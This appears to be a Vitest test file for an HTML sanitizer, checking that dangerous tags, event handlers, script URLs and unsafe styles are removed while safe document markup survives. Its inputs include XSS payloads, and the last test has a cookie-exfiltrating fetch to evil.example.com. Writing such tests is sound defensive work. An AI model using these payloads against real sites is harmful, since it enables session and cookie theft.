/**
 * Tests for the sanitizeHtml utility.
 *
 * These tests prove that unsafe markup is NOT rendered, while safe document
 * structure (headings, paragraphs, bold, links with http/https) passes through.
 */

import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '@/utils/sanitizeHtml';

describe('sanitizeHtml', () => {
    // ── Basic safety ──────────────────────────────────────────────────────

    it('returns empty string for empty input', () => {
        expect(sanitizeHtml('')).toBe('');
    });

    it('passes plain text through unchanged', () => {
        expect(sanitizeHtml('Hello world')).toBe('Hello world');
    });

    // ── Script / style removal ─────────────────────────────────────────────

    it('removes <script> tags and their content', () => {
        const input = '<p>Safe</p><script>alert(1)</script><p>Text</p>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('alert(1)');
        expect(result).toContain('<p>Safe</p>');
    });

    it('removes <style> tags and their content', () => {
        const input = '<style>body{display:none}</style><p>Hello</p>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('<style>');
        expect(result).not.toContain('display:none');
    });

    it('removes <iframe> tags', () => {
        const input = '<iframe src="https://evil.example.com"></iframe>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('<iframe');
        expect(result).not.toContain('evil.example.com');
    });

    it('removes <object> tags', () => {
        const input = '<object data="evil.swf"></object>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('<object');
    });

    it('removes <svg> blocks', () => {
        const input = '<svg onload="alert(1)"><circle/></svg>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('<svg');
        expect(result).not.toContain('onload');
    });

    it('removes HTML comments', () => {
        const input = '<!-- <script>alert(1)</script> --><p>Safe</p>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('<!--');
        expect(result).toContain('<p>Safe</p>');
    });

    // ── Event-handler attributes ───────────────────────────────────────────

    it('strips onerror attribute from img tag (img is not allowlisted, so removed)', () => {
        const input = '<img src="x" onerror="alert(1)">';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('onerror');
        expect(result).not.toContain('<img');
    });

    it('strips onclick from a div', () => {
        const input = '<div onclick="evil()">text</div>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('onclick');
        expect(result).toContain('<div>');
    });

    it('strips onmouseover from a span', () => {
        const input = '<span onmouseover="evil()">text</span>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('onmouseover');
    });

    // ── Dangerous URL schemes ──────────────────────────────────────────────

    it('strips javascript: href from <a>', () => {
        const input = '<a href="javascript:alert(1)">click</a>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('javascript:');
        expect(result).not.toContain('href="javascript:');
    });

    it('strips data: href from <a>', () => {
        const input = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('data:');
    });

    it('strips vbscript: href from <a>', () => {
        const input = '<a href="vbscript:MsgBox(1)">click</a>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('vbscript:');
    });

    // ── Safe content passes through ────────────────────────────────────────

    it('preserves https:// href on <a>', () => {
        const input = '<a href="https://example.com">link</a>';
        const result = sanitizeHtml(input);
        expect(result).toContain('href="https://example.com"');
        expect(result).toContain('>link</a>');
    });

    it('preserves http:// href on <a>', () => {
        const input = '<a href="http://example.com">link</a>';
        const result = sanitizeHtml(input);
        expect(result).toContain('href="http://example.com"');
    });

    it('always adds rel="noopener noreferrer" to <a>', () => {
        const input = '<a href="https://example.com">link</a>';
        const result = sanitizeHtml(input);
        expect(result).toContain('rel="noopener noreferrer"');
    });

    it('always sets target="_blank" on <a>', () => {
        const input = '<a href="https://example.com">link</a>';
        const result = sanitizeHtml(input);
        expect(result).toContain('target="_blank"');
    });

    it('preserves headings', () => {
        const input = '<h1>Title</h1><h2>Sub</h2>';
        const result = sanitizeHtml(input);
        expect(result).toContain('<h1>Title</h1>');
        expect(result).toContain('<h2>Sub</h2>');
    });

    it('preserves bold and italic', () => {
        const input = '<p>Hello <b>world</b> and <i>there</i></p>';
        const result = sanitizeHtml(input);
        expect(result).toContain('<b>world</b>');
        expect(result).toContain('<i>there</i>');
    });

    it('preserves table structure', () => {
        const input = '<table><thead><tr><th>Col</th></tr></thead><tbody><tr><td>Val</td></tr></tbody></table>';
        const result = sanitizeHtml(input);
        expect(result).toContain('<table>');
        expect(result).toContain('<thead>');
        expect(result).toContain('<th>');
        expect(result).toContain('<td>Val</td>');
    });

    // ── Style attribute sanitization ────────────────────────────────────────

    it('preserves safe inline style (text-align:justify) on paragraphs', () => {
        const input = '<p style="text-align:justify">Body text</p>';
        const result = sanitizeHtml(input);
        // Either spacing variant is acceptable
        expect(result).toMatch(/style="text-align\s*:\s*justify/);
        expect(result).toContain('>Body text</p>');
    });

    it('strips expression() from inline style', () => {
        const input = '<p style="color: expression(alert(1))">text</p>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('expression(');
    });

    it('strips javascript: from inline style', () => {
        const input = '<p style="background: javascript:alert(1)">text</p>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('javascript:');
    });

    it('strips url() from inline style (could load remote content)', () => {
        const input = '<div style="background: url(https://evil.com/track.png)">text</div>';
        const result = sanitizeHtml(input);
        expect(result).not.toContain('url(');
    });

    it('preserves font-size and font-family in style attribute', () => {
        const input = '<p style="font-size:12pt; font-family:Times New Roman,serif">text</p>';
        const result = sanitizeHtml(input);
        expect(result).toContain('font-size');
        expect(result).toContain('font-family');
    });

    it('preserves Word-generated MsoNormal structure after sanitization', () => {
        const wordHtml = `
            <html><head><style>p.MsoNormal { font-size:12pt }</style></head>
            <body><div class="WordSection1">
                <h1 class="MsoNormal" style="text-align:justify"><b>Title</b></h1>
                <p class="MsoNormal" style="text-align:justify">Body text here.</p>
            </div></body></html>
        `;
        const result = sanitizeHtml(wordHtml);
        // Style block removed
        expect(result).not.toContain('<style>');
        // But the elements and their safe attributes pass through
        expect(result).toContain('<h1');
        expect(result).toContain('class="MsoNormal"');
        expect(result).toContain('<p');
        expect(result).toContain('Body text here.');
        expect(result).toContain('<b>Title</b>');
    });

    // ── Data disclosure real-world scenario ────────────────────────────────

    it('sanitizes a realistic malicious data disclosure document', () => {
        const malicious = `
            <h1>Data Disclosure Agreement</h1>
            <p>This is legitimate text.</p>
            <script>document.cookie='stolen='+document.cookie</script>
            <iframe src="https://evil.example.com/steal?c=cookie"></iframe>
            <p>More <b>legitimate</b> text.</p>
            <a href="javascript:fetch('https://evil.example.com/?c='+document.cookie)">click</a>
            <img src=x onerror=alert(document.domain)>
            <style>body{visibility:hidden}</style>
            <p onmouseover="evil()">Paragraph with event</p>
        `;
        const result = sanitizeHtml(malicious);

        // Dangerous content removed
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('document.cookie');
        expect(result).not.toContain('<iframe');
        expect(result).not.toContain('javascript:');
        expect(result).not.toContain('onerror');
        expect(result).not.toContain('<style>');
        expect(result).not.toContain('visibility:hidden');
        expect(result).not.toContain('onmouseover');

        // Safe content preserved
        expect(result).toContain('<h1>');
        expect(result).toContain('legitimate');
        expect(result).toContain('<b>legitimate</b>');
    });
});
